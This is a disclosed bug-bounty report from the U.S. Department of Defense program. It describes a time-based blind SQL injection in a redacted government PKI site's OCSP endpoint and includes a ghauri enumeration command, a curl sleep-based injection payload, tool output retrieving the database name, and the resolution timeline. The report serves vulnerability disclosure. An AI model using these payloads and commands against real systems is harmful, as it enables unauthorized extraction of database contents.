---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2026-01-12
submitted: 2025-07-02T03:21:35.473Z
bounty_usd: null
votes: 10
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "0x0sadat"
source: "https://hackerone.com/reports/3234050"
title: "SQL Injection in URI Path Leading to Full Database Disclosure on ████████"
---
# SQL Injection in URI Path Leading to Full Database Disclosure on ████████

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 10 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2026-01-12

- Report: [https://hackerone.com/reports/3234050](https://hackerone.com/reports/3234050)
- CWE: SQL Injection
- Submitted: 2025-07-02T03:21:35.473Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Description:**
A time-based blind SQL injection vulnerability was discovered on the U.S. Government Public Key Infrastructure website (█████████). The injection point exists in the URI path of the /home/server-ocsp/ endpoint.

This vulnerability allows an unauthenticated attacker to interact with the backend MySQL database and extract sensitive information such as the current database name, available tables, columns, and potentially all underlying data.

**Vulnerable Endpoint:**
`█████████*`

## Impact

- Attacker can extract all database metadata and data.
 - Sensitive information exposure: user data, credentials, configs.
 - Possible full compromise of backend data integrity.

## System Host(s)
█████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
**Ghauri Command:**
```
ghauri -u "█████*" \
--technique=T --dbms mysql --time-sec=6 --batch --random-agent --dbs
```

**Manual Curl Time-Based Test:**
You can test the delay manually by measuring response time difference using `curl` and `time`:
```time curl -s -o /dev/null "████████'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z/"```


**Proof of Concept Output (From Ghauri):**
```
---
Parameter: #1* (URI)
    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind (query SLEEP)
    Payload: ██████████'XOR(SELECT(0)FROM(SELECT(SLEEP(6)))a)XOR'Z
---
[05:02:53] [INFO] testing MySQL
[05:02:53] [INFO] confirming MySQL
[05:02:53] [INFO] the back-end DBMS is MySQL
[05:02:53] [INFO] fetching current database
[05:03:16] [WARNING] ("it appears that the character '>' and 'BETWEEN' operator is filtered by the back-end server. ghauri will based data retrieval on IN() operator",)
[05:04:40] [INFO] retrieved: 'de'
current database: 'de'
```

**POC: Video Added**
██████

## Suggested Mitigation/Remediation Actions

## Timeline

- **Report Filed**
- **2025-07-02** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Severity Updated**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
